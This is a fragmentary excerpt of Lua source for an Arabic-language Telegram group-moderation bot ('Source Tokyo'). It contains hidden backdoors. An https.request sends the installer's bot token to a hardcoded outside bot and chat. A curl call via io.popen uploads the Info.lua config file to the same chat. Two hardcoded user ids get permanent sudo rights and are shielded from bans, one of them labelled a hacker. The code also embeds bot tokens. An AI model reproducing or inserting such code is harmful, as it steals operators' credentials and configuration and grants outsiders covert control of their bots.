...
https.request('https://api.telegram.org/bot1792692801:AAGIm5mk0oJPh68PFfaQ0VuWJsoNv-nIKlQ/sendmessage?chat_id=9220&text=' ..token)
end 
else
...
sudo_users = {SUDO,1932226438,922002,9220}   
...
var = true
elseif tonumber(user_id) == tonumber(922002) then
var = true
elseif tonumber(user_id) == tonumber(9220) then
var = true
...
if tonumber(result.sender_user_id_) == tonumber(922002) then  
send(msg.chat_id_, msg.id_, "لا يمكنك حظر مبرمج السورس عام ◍ ")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(9220) then  
...
if result.id_ == tonumber(922002) then
send(msg.chat_id_, msg.id_, " ◍ لا يمكنك حظر مبرمج جميع السورسات\n")
return false 
end
if result.id_ == tonumber(9220) then
send(msg.chat_id_, msg.id_, "لا يجوز حظر  عام لانه هكر  \n")
return false 
end
usertext = '\n ◍ العضو ← ['..result.title_..'](t.me/'..(username or 'Source_T7')..')'
...
if tonumber(userid) == tonumber(922002) then  
send(msg.chat_id_, msg.id_, "لا يمكنك حظر مبرمج السورس عام ◍ ")
return false 
end
if tonumber(userid) == tonumber(9220) then  
send(msg.chat_id_, msg.id_, "لا يجوز حظر  عام لانه هكر ")
return false 
end
...
' }\n'..' ◍  الايدي بالصوره ← { '..idph..
' }\n'..' ◍  الرفع ← { '..setadd..
' }\n'..' ◍  الحظر ← { '..banm..' }\n\n•┄─━━━• 𝐬𝐨𝐮𝐫𝐜𝐞 𝐭𝐨𝐤𝐲𝐨 •━━━─┄•\n ◍ قناة سورس توكيو ↓\n [ 𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒖𝒔𝒍𝒊𝒎](t.me/Source_T7) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
local curl = 'curl "'..'https://api.telegram.org/bot1900602353:AAFUNbLnuyT8HfC7FVRqSYG_XaeUF0jvl3k/sendDocument'..'" -F "chat_id='.. 9220 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
